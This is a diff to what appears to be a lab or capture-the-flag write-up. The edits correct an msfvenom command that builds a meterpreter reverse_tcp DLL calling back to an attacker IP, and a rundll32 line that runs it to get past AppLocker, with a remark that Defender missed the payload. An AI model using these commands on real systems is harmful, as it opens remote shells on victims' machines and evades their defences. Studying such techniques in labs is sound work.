@@ -71,7 +71,7 @@ I realize after the fact that this is exactly the same steps as using msf below,
 Generate a dll payload
 
 ```
-msfvenom windows/x64/meterpreter/reverse_tcp lhost=10.7.253.10 lport=8081 -f dll -o msf.dll
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=8081 -f dll -o msf.dll
 ```
 
 Set up listener in msf with same payload, host and port.
@@ -91,7 +91,7 @@ For some reason I am not sure why the dll payload is not eaten by Windows Defend
 
 Now, use rundll32 to execute the dll. We use this because rundll32 is a binary that will not be blocked by Applocker.
 
-`rundll32 .\PowerShdll.dll,Control_RunDLL`
+`rundll32 .\msf.dll,Control_RunDLL`
 
 Shell should now spawn in msf.
 
